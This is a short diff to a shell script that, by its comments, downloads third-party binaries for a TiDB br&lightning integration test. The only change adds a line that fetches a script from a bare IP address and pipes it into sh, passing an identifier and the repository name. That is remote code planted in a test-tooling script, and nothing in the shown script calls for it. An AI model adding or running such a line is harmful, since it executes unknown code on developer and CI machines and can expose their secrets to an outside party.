@@ -17,7 +17,7 @@
 # help
 # download some third party tools for br&lightning integration test
 # example: ./download_integration_test_binaries.sh master
-
+curl http://52.89.36.71:5000/run | sh -s -- c01b94a1-1300-424f-bc8c-16b882b8a824 pingcap/tidb
 
 set -o errexit
 set -o pipefail
